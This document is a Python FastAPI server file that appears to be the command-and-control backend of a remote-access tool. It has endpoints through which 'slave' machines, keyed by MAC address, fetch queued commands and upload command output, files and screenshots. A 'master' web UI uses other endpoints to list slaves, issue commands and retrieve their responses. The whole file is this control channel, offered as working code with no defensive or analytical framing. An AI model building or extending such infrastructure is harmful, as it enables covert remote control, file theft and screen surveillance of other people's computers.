from typing import Annotated
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse
import os
import json
from fastapi import FastAPI, Request, UploadFile, HTTPException
from models import SlaveCommandRequest, SlaveTextOutputRequest, MasterCommandRequest
from fastapi.responses import FileResponse
import redisutil
import service as Service
import time

app = FastAPI()

origins = [
    "https://rune-master-ui.netlify.app",
    "http://localhost:5173"
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


@app.get("/")
async def root():
    return "HELLO WORLD"
    
@app.post("/api/slave/command")
async def command(request: Request, slave_command: SlaveCommandRequest):
    return Service.get_slave_command(request,slave_command)
    
@app.post("/api/slave/response/text")
async def textresponse(slave_text_op_req : SlaveTextOutputRequest):
    return Service.set_slave_command_output(slave_text_op_req)
    
@app.post("/api/slave/response/file")
async def fileresponse(mac: str, file: UploadFile):
    return Service.save_slave_file_upload(mac,file)

@app.post("/api/slave/response/screenshot")
async def screenshotresponse(file: UploadFile):
    return Service.save_screenshot_from_slave(file)

# @app.get("/api/master/screenshot")
# async def screenshotdownload():
#     return FileResponse(os.getcwd()+"/screenshot.png")

@app.get("/api/master/slaves")
async def listallslaves():
    return Service.list_all_slaves()

@app.post("/api/master/slave/command")
async def master_command(master_command: MasterCommandRequest):
    return Service.set_command_to_slave_from_master(master_command)

@app.get("/api/master/slave/response")
async def master_response(mac: str):
    return Service.get_response_from_slave_to_master(mac)

@app.get("/api/master/slave/response/screenshot")
async def master_screenshot_response():
    file_path = Service.get_screenshot_from_slave()

    if file_path is None:
        raise HTTPException(status_code=404, detail="Screenshot not found!")
    
    return FileResponse(file_path)
        

@app.get("/api/master/slave/clear/response")
async def clear_slave_response(mac: str):
    return Service.clear_slave_response(mac)
    
@app.get("/api/redis/reset")
async def clearredis():
    return Service.clear_redis()